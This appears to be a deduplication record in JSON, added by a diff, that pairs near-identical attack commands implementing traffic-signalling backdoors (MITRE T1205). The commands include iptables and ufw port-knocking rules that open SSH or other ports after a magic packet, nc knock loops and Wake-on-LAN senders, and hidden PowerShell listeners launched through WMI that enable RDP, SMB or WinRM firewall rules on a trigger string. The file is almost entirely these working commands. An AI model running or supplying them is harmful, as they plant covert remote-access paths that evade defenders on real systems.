@@ -1,0 +1,86 @@
+{
+  "10": {
+    "Duplicated": 1,
+    "ComparedTo": 11,
+    "RemovedSentence": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p icmp -m string --hex-string '|50 49 4E 47 5F 4B 4E 4F 43 4B 5F 39 30 39 30|' --algo bm -j LOG --log-prefix 'T1205_ICMP_SIG ' --log-level 4 && iptables -I INPUT -p icmp -m string --hex-string '|50 49 4E 47 5F 4B 4E 4F 43 4B 5F 39 30 39 30|' --algo bm -m recent --name t1205_icmp --set && iptables -I INPUT -p tcp --dport 9090 -m recent --name t1205_icmp --rcheck --seconds 45 --reap -j ACCEPT\"",
+    "ComparedSentence": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p udp --dport 9 -m string --hex-string '|FF FF FF FF FF FF|' --algo bm -j LOG --log-prefix 'T1205_WOL_SIG ' --log-level 4 && iptables -I INPUT -p udp --dport 9 -m string --hex-string '|FF FF FF FF FF FF|' --algo bm -m recent --name t1205_wol --set && iptables -I INPUT -p tcp --dport 5555 -m recent --name t1205_wol --rcheck --seconds 30 --reap -j ACCEPT\"",
+    "SimilarityScore": 0.9000416994094849
+  },
+  "14": {
+    "Duplicated": 1,
+    "ComparedTo": 19,
+    "RemovedSentence": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p tcp --dport 80 -m string --string 'X-Open-SSH: 1' --algo bm -j LOG --log-prefix 'T1205_HTTP_SIG ' --log-level 4 && iptables -I INPUT -p tcp --dport 80 -m string --string 'X-Open-SSH: 1' --algo bm -m recent --name t1205_http --set && iptables -I INPUT -p tcp --dport 22 -m recent --name t1205_http --rcheck --seconds 60 --reap -j ACCEPT\"",
+    "ComparedSentence": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p tcp --dport 22 -m string --string 'SSH-2.0-KNOCK' --algo bm -j LOG --log-prefix 'T1205_SSH_BANNER ' --log-level 4 && iptables -I INPUT -p tcp --dport 22 -m string --string 'SSH-2.0-KNOCK' --algo bm -m recent --name t1205_ssh --set && iptables -I INPUT -p tcp --dport 2222 -m recent --name t1205_ssh --rcheck --seconds 30 --reap -j ACCEPT\"",
+    "SimilarityScore": 0.9113890528678894
+  },
+  "35": {
+    "Duplicated": 1,
+    "ComparedTo": 52,
+    "RemovedSentence": "for p in 7001 8002 9003; do nc -u -w1 192.0.2.10 \"$p\" </dev/null; sleep 0.75; done",
+    "ComparedSentence": "for p in 7000 8001 9002; do nc -w1 -u 192.0.2.10 \"$p\" </dev/null; sleep 0.5; done",
+    "SimilarityScore": 0.9393743872642517
+  },
+  "40": {
+    "Duplicated": 1,
+    "ComparedTo": 71,
+    "RemovedSentence": "sudo bash -c 'iptables -N KNOCK 2>/dev/null; iptables -F KNOCK; iptables -A INPUT -p tcp --dport 7000 -m recent --name K1 --set -j DROP; iptables -A INPUT -p tcp --dport 8000 -m recent --rcheck --seconds 10 --name K1 -m recent --name K2 --set -j DROP; iptables -A INPUT -p tcp --dport 9000 -m recent --rcheck --seconds 10 --name K2 -m recent --name AUTH --set -j DROP; iptables -A INPUT -p tcp --dport 22 -m recent --name AUTH --rcheck --seconds 60 -j ACCEPT'",
+    "ComparedSentence": "sudo bash -c 'iptables -N KNOCK 2>/dev/null; iptables -F KNOCK; iptables -I INPUT -p udp --dport 11111 -m recent --name K1 --set; iptables -I INPUT -p udp --dport 22222 -m recent --name K1 --rcheck --seconds 10 --hitcount 1 --rttl -m recent --name K2 --set; iptables -I INPUT -p udp --dport 33333 -m recent --name K2 --rcheck --seconds 10 --hitcount 1 --rttl -m recent --name AUTHD --set; iptables -I INPUT -p tcp --dport 22 -m recent --name AUTHD --rcheck --seconds 30 -j ACCEPT'",
+    "SimilarityScore": 0.9365137815475464
+  },
+  "70": {
+    "Duplicated": 1,
+    "ComparedTo": 72,
+    "RemovedSentence": "sudo bash -c 'ethtool -s eth0 wol g; MAC=00:11:22:33:44:55; mac=$(echo $MAC | tr -d :); hex=$(printf ff%.0s {1..6}; for i in {1..16}; do echo -n $mac; done); echo -n $hex | xxd -r -p | nc -u -w1 192.0.2.10 9'",
+    "ComparedSentence": "sudo bash -c 'ethtool -s eth0 wol g sopass 11:22:33:44:55:66; MAC=00:11:22:33:44:55; PASS=112233445566; mac=$(echo $MAC | tr -d :); hex=$(printf ff%.0s {1..6}; for i in {1..16}; do echo -n $mac; done); echo -n ${hex}${PASS} | xxd -r -p | nc -u -w1 192.0.2.10 9'",
+    "SimilarityScore": 0.9487410187721252
+  },
+  "115": {
+    "Duplicated": 1,
+    "ComparedTo": 118,
+    "RemovedSentence": "bash -lc 'ufw --force enable && ufw default deny incoming && ufw logging high && iptables -I ufw-before-input 1 -p udp --dport 7001 -m state --state NEW -m recent --name S1 --set && iptables -I ufw-before-input 1 -p tcp --dport 8001 -m tcp --syn -m recent --rcheck --seconds 10 --name S1 -m recent --name S2 --set && iptables -I ufw-before-input 1 -p udp --dport 9001 -m state --state NEW -m recent --rcheck --seconds 10 --name S2 -m recent --name S3 --set && iptables -I ufw-before-input 1 -p tcp --dport 2222 -m recent --rcheck --seconds 20 --name S3 -j ACCEPT'",
+    "ComparedSentence": "bash -lc 'ufw --force enable && ufw default deny incoming && ufw logging high && iptables -I ufw-before-input 1 -p tcp --dport 1111 -m state --state NEW -m recent --name K1 --set && iptables -I ufw-before-input 1 -p tcp --dport 2222 -m state --state NEW -m recent --rcheck --seconds 10 --name K1 -m recent --name K2 --set && iptables -I ufw-before-input 1 -p tcp --dport 3333 -m state --state NEW -m recent --rcheck --seconds 10 --name K2 -m recent --name K3 --set && iptables -I ufw-before-input 1 -p tcp --dport 22 -m state --state NEW -m recent --rcheck --seconds 20 --name K3 -j ACCEPT'",
+    "SimilarityScore": 0.936975359916687
+  },
+  "150": {
+    "Duplicated": 1,
+    "ComparedTo": 152,
+    "RemovedSentence": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'ALLOW\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+255\\.255\\.255\\.255\\s+\\d+\\s+9\\b.*\\bsize\\s+10(2|8)\\b') { $src=$matches[1]; $name=\"wol-rdp-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+    "ComparedSentence": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\\b(ALLOW|DROP)\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+3544\\b') { $src=$matches[2]; $name=\"teredo-rdp-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+    "SimilarityScore": 0.9445879459381104
+  },
+  "151": {
+    "Duplicated": 1,
+    "ComparedTo": 152,
+    "RemovedSentence": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\\b(ALLOW|DROP)\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+3702\\b') { $src=$matches[2]; $name=\"wsd-winrm-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -RemoteAddress $src -EdgeTraversalPolicy Allow -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+    "ComparedSentence": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\\b(ALLOW|DROP)\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+3544\\b') { $src=$matches[2]; $name=\"teredo-rdp-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+    "SimilarityScore": 0.909061849117279
+  },
+  "152": {
+    "Duplicated": 1,
+    "ComparedTo": 156,
+    "RemovedSentence": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\\b(ALLOW|DROP)\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+3544\\b') { $src=$matches[2]; $name=\"teredo-rdp-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+    "ComparedSentence": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+5060\\b') { $src=$matches[1]; $name=\"sip-winrmhttps-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+    "SimilarityScore": 0.9085816740989685
+  },
+  "156": {
+    "Duplicated": 1,
+    "ComparedTo": 158,
+    "RemovedSentence": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+5060\\b') { $src=$matches[1]; $name=\"sip-winrmhttps-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+    "ComparedSentence": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+53\\b') { $src=$matches[1]; $name=\"dns-txt-5986-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+    "SimilarityScore": 0.9394763112068176
+  },
+  "161": {
+    "Duplicated": 1,
+    "ComparedTo": 164,
+    "RemovedSentence": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(5355); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 20){ $p=12; $n=''; while($p -lt $d.Length){ $l=$d[$p]; if($l -eq 0){$p++; break}; $p++; $n += [Text.Encoding]::ASCII.GetString($d,$p,$l)+''.''; $p+=$l }; if($n -eq ''svc-open.''){ Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -Enabled True -RemoteAddress $ep.Address; break } } } }'",
+    "ComparedSentence": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(137); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 50){ $s=[Text.Encoding]::ASCII.GetString($d); if($s -like ''*CORP-CHECKIN*''){ Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Enabled True -RemoteAddress $ep.Address; break } } } }'",
+    "SimilarityScore": 0.9139522314071655
+  },
+  "166": {
+    "Duplicated": 1,
+    "ComparedTo": 169,
+    "RemovedSentence": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(1900); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); $s=[Text.Encoding]::ASCII.GetString($d); if(($s -like ''*M-SEARCH*'') -and ($s -like ''*ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1*'') -and ($s -like ''*X-Token: abc123*'')){ Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Enabled True -RemoteAddress $ep.Address; break } } }'",
+    "ComparedSentence": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RDP-Syslog'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RDP-Syslog'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-Syslog'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(514); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); $s=[Text.Encoding]::ASCII.GetString($d); if($s -like ''*ALLOW-RDP*''){ Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-Syslog'' -Enabled True -RemoteAddress $ep.Address; break } } }'",
+    "SimilarityScore": 0.9047839641571045
+  }
+}
